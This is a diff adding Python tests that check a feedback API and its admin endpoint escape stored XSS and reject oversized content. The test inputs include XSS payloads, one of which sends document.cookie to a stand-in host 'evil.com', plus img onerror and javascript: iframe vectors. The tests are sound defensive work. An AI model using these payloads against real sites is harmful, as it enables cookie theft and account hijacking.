@@ -203,3 +203,67 @@ class TestUserFeedbackSystem:
         assert "pending_feedbacks" in alerts
         assert alerts["pending_feedbacks"] == 1
         assert alerts["urgent_feedbacks"] == 1
+
+    def test_stored_xss_prevention_on_submit(self, client: TestClient, db_session: Session):
+        """Attacker attempting Stored XSS injection via feedback is neutralized."""
+        xss_payload = {
+            "sender_name": "<script>alert('pwned')</script>",
+            "sender_email": "xss_test@example.com",
+            "title": "<img src=x onerror=alert(1)> Urgent Bug",
+            "content": "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script> Regular text",
+            "feedback_type": "bug_report",
+        }
+        resp = client.post("/feedback", json=xss_payload)
+        assert resp.status_code in (200, 201), resp.text
+        data = resp.json()
+        assert "<script>" not in data["sender_name"]
+        assert "&lt;script&gt;" in data["sender_name"]
+        assert "<img" not in data["title"]
+        assert "&lt;img" in data["title"]
+        assert "<script>" not in data["content"]
+        assert "&lt;script&gt;" in data["content"]
+
+    def test_oversized_content_rejected_with_422(self, client: TestClient, db_session: Session):
+        """Oversized payload > 5000 chars is rejected before reaching DB."""
+        oversized_payload = {
+            "sender_name": "Test Spammer",
+            "sender_email": "spam@example.com",
+            "title": "Flooding content",
+            "content": "A" * 5001,
+            "feedback_type": "general",
+        }
+        resp = client.post("/feedback", json=oversized_payload)
+        assert resp.status_code == 422
+
+    def test_admin_response_stored_xss_prevention(
+        self, client: TestClient, db_session: Session, admin_user_and_headers: tuple[User, dict[str, str]]
+    ):
+        """Admin response fields are also sanitized against Stored XSS."""
+        _, admin_headers = admin_user_and_headers
+        fb = UserFeedback(
+            sender_name="Legit User",
+            sender_email="legit@test.com",
+            user_role="candidate",
+            feedback_type="general",
+            title="Normal Title",
+            content="Normal content text",
+            status="new",
+        )
+        db_session.add(fb)
+        db_session.commit()
+
+        patch_resp = client.patch(
+            f"/admin/feedback/{fb.id}",
+            json={
+                "admin_response": "<script>alert('admin_xss')</script> Cảm ơn bạn!",
+                "admin_notes": "<iframe src='javascript:alert(1)'></iframe> internal note",
+            },
+            headers=admin_headers,
+        )
+        assert patch_resp.status_code == 200
+        data = patch_resp.json()
+        assert "<script>" not in data["admin_response"]
+        assert "&lt;script&gt;" in data["admin_response"]
+        assert "<iframe" not in data["admin_notes"]
+        assert "&lt;iframe" in data["admin_notes"]
+
